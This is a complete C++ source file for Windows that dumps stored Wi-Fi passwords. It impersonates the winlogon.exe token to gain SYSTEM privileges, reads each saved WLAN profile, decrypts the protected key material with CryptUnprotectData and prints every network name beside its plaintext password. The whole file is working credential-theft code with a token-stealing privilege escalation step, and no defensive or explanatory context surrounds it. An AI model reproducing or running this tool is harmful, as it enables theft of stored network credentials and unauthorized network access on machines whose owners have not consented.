//Dump stored Wifi passwords

#include <windows.h>
#include <string.h>
#include <iostream>
#include <wlanapi.h>
#include <wincrypt.h>
#include <tlhelp32.h>

#pragma comment(lib,"Wlanapi.lib")
#pragma comment(lib,"Crypt32.lib")
#pragma warning(disable:4996)

//Steal token of winlogon.exe process 

BOOL StealToken() {
    HANDLE hSnap;
    HANDLE hProcess;
    HANDLE hToken;
    PROCESSENTRY32 process;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        printf("Error [CreateToolhelp32Snapshot] :%d\n", GetLastError());
        return FALSE;
    }

    process.dwSize = sizeof(PROCESSENTRY32);
    Process32First(hSnap, &process);
    do {

        if (wcscmp(process.szExeFile, L"winlogon.exe") == 0) {
            hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, process.th32ProcessID);
            if (hProcess == NULL) {
                printf("Error [OpenProcess] :%d\n", GetLastError());
                return FALSE;
            }
            if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken)) {
                printf("Error [OpenProcessToken] :%d\n", GetLastError());
                return FALSE;
            }
            if (ImpersonateLoggedOnUser(hToken)) {
                return TRUE;
            }
            return FALSE;

        }
    } while (Process32Next(hSnap, &process));
    return FALSE;
}

void DumpWifi() {
    DWORD dwClientVersion = 2;
    HANDLE phClientHandle;
    DWORD success;
    DWORD flag = 4;
    DWORD granted = 0;
    DWORD len_need = 0;
    DATA_BLOB cryptoblob = { 0 };
    DATA_BLOB decryptedblob = { 0 };
   
    PWLAN_INTERFACE_INFO_LIST ppInterfaceList;
    wchar_t token[] = L"<keyMaterial>";
    wchar_t token2[] = L"</keyMaterial>";
    wchar_t is_protected[] = L"<protected>";
    wchar_t is_protected2[] = L"</protected>";
    success = WlanOpenHandle(dwClientVersion, NULL, &dwClientVersion, &phClientHandle);
    if (success != ERROR_SUCCESS) {
        printf("Error[WlanOpenHandle]: %d\n", success);
        exit(0);
    }
    success = WlanEnumInterfaces(phClientHandle, NULL, &ppInterfaceList);
    if (success != ERROR_SUCCESS) {
        printf("Error[WlanEnumInterfaces]: %d\n", success);
        exit(0);
    }
    for (int i = 0; i < ppInterfaceList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST ppProfileList;
        success = WlanGetProfileList(phClientHandle, &ppInterfaceList->InterfaceInfo[i].InterfaceGuid, NULL, &ppProfileList);
        if (success != ERROR_SUCCESS) {
            printf("Error[WlanGetProfileList]: %d\n", success);
            exit(0);
        }
        printf("WiFi Name:Password\r\n\r\n");
        for (int j = 0; j < ppProfileList->dwNumberOfItems; j++) {
            LPWSTR xml;
            success = WlanGetProfile(phClientHandle, &ppInterfaceList->InterfaceInfo[i].InterfaceGuid, ppProfileList->ProfileInfo[j].strProfileName, NULL, &xml, &flag, &granted);
            if (success != ERROR_SUCCESS) {
                printf("Error[WlanGetProfile]: %d\n", success);
                exit(0);
            }
            //parse xml shitty way using c++ cause i suck at c :) 
            std::wstring s = xml;

            int position1 = s.find(token)+wcslen(token);
            int position2 = s.find(token2);
            int key_len = position2- position1;
            int prot_position1 = s.find(is_protected)+wcslen(is_protected);
            int prot_position2 = s.find(is_protected2);
            int protected_len = prot_position2 - prot_position1;
            std::wstring protected_key = s.substr(prot_position1, protected_len);
            std::wstring key = s.substr(position1, key_len);
            
            if (!key.empty() && wcscmp(protected_key.c_str(),L"true")==0) {

                CryptStringToBinary(key.c_str(), NULL, CRYPT_STRING_HEX, NULL, &len_need, NULL, NULL);
                BYTE* blob = (BYTE*)malloc(len_need);
                if (CryptStringToBinary(key.c_str(), key.length(), CRYPT_STRING_HEX, blob, &len_need, NULL, NULL)) {
                    cryptoblob.cbData = len_need;
                    cryptoblob.pbData = blob;

                    if (CryptUnprotectData(&cryptoblob, NULL, NULL, NULL, NULL, 0, &decryptedblob)) {
                        printf("%ws:%s\n", ppProfileList->ProfileInfo[j].strProfileName, decryptedblob.pbData);
                        LocalFree(decryptedblob.pbData); 
                    }
                    else {
                        printf("Error[CryptUnprotectData]: %d\n", GetLastError());
                    }

                }
            }
            else {
                printf("%ws:%ws\n", ppProfileList->ProfileInfo[j].strProfileName,key.c_str());
            }
            WlanFreeMemory(xml);
        }
    }
}
int main()
{
    
    if (StealToken()) {
        DumpWifi();
        return 0;
    }
    printf("Couldn't steal SYSTEM token!\n");
    return -1;
}


